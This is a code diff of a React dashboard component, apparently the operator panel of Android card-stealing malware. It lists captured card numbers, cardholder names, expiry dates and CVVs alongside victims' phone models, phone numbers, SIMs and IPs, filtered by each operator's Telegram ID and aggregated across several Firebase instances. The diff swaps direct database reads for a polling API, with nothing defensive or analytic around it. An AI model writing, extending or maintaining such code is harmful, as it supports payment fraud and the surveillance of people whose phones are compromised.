@@ -1,8 +1,7 @@
-import { useEffect, useState, useMemo } from "react";
-import { db } from "@/lib/firebase";
-import { ref, onValue } from "firebase/database";
+import { useEffect, useMemo, useState } from "react";
 import { Layout } from "@/components/layout";
-import { useAuth } from "@/lib/auth";
+import { getScraped, type ScrapedCard, type ScrapedDevice } from "@/lib/api";
+import { usePolling } from "@/lib/usePolling";
 import {
   CreditCard,
   Smartphone,
@@ -20,99 +19,25 @@ import {
   EyeOff,
 } from "lucide-react";
 
-interface CardCapture {
-  deviceId: string;
-  deviceModel: string;
-  devicePhone: string;
-  ownerTelegramId: string | null;
-  cardNumber: string;
-  cardholderName: string;
-  expiry: string;
-  cvv: string;
-  ip: string;
-  timestamp: string;
-}
-
-interface DeviceInfo {
-  deviceId: string;
-  model: string;
-  phone: string;
-  sim1: string;
-  sim2: string;
-  battery: string;
-  ip: string;
-  storage: string;
-  androidV: string;
-  joined: string;
-  status: boolean;
-  ownerTelegramId: string | null;
-}
-
 export function ScrapedData() {
-  const { isAdmin, userId } = useAuth();
-  const [cards, setCards] = useState<CardCapture[]>([]);
-  const [devices, setDevices] = useState<DeviceInfo[]>([]);
+  const [cards, setCards] = useState<ScrapedCard[]>([]);
+  const [devices, setDevices] = useState<ScrapedDevice[]>([]);
   const [loading, setLoading] = useState(true);
   const [tab, setTab] = useState<"cards" | "devices">("cards");
   const [search, setSearch] = useState("");
   const [masked, setMasked] = useState(true);
   const [copied, setCopied] = useState<string | null>(null);
 
+  // Card captures + device info served by the api-server (Bearer auth,
+  // owner-filtered), aggregated across all Firebase instances.
+  const { data: scrapeData } = usePolling(getScraped, 4000);
+
   useEffect(() => {
-    const unsub = onValue(ref(db, "clients"), (snap) => {
-      const clients: Record<string, any> = snap.exists() ? snap.val() : {};
-      const cardList: CardCapture[] = [];
-      const deviceList: DeviceInfo[] = [];
-
-      Object.entries(clients).forEach(([deviceId, d]) => {
-        if (deviceId.startsWith("*")) return;
-        const owner = d?.ownerTelegramId || null;
-        if (!isAdmin && owner !== userId) return;
-
-        const sims: any[] = Array.isArray(d?.sims) ? d.sims : [];
-        const simStr = (s: any) =>
-          s?.phoneNumber && s.phoneNumber !== "Unknown" ? s.phoneNumber : "";
-
-        deviceList.push({
-          deviceId,
-          model: d?.modelName || d?.model || "Unknown",
-          phone: d?.mobNo || d?.phone || "",
-          sim1: simStr(sims[0]) || "",
-          sim2: simStr(sims[1]) || "",
-          battery: d?.battery || "?",
-          ip: d?.ip_address || "—",
-          storage: d?.storage || "—",
-          androidV: d?.androidV || "—",
-          joined: d?.joined || "—",
-          status: typeof d?.status === "boolean" ? d.status : false,
-          ownerTelegramId: owner,
-        });
-
-        const cardNumber = d?.cc_cardNumber || d?.cardNumber || null;
-        if (cardNumber) {
-          cardList.push({
-            deviceId,
-            deviceModel: d?.modelName || d?.model || "Unknown",
-            devicePhone: d?.mobNo || d?.phone || "",
-            ownerTelegramId: owner,
-            cardNumber,
-            cardholderName:
-              d?.cc_cardholderName || d?.cardholderName || "Unknown",
-            expiry: d?.cc_expiry || d?.expiry || "??/??",
-            cvv: d?.cc_cvv || d?.cvv || "???",
-            ip: d?.cc_ip || d?.ip_address || "—",
-            timestamp: d?.cc_timestamp || d?.timestamp || "—",
-          });
-        }
-      });
-
-      cardList.sort((a, b) => (b.timestamp > a.timestamp ? 1 : -1));
-      setCards(cardList);
-      setDevices(deviceList);
-      setLoading(false);
-    });
-    return () => unsub();
-  }, [isAdmin, userId]);
+    if (!scrapeData) return;
+    setCards(scrapeData.cards || []);
+    setDevices(scrapeData.devices || []);
+    setLoading(false);
+  }, [scrapeData]);
 
   const mask = (n: string) =>
     masked && n.length > 8 ? "•••• •••• " + n.slice(-4) : n;
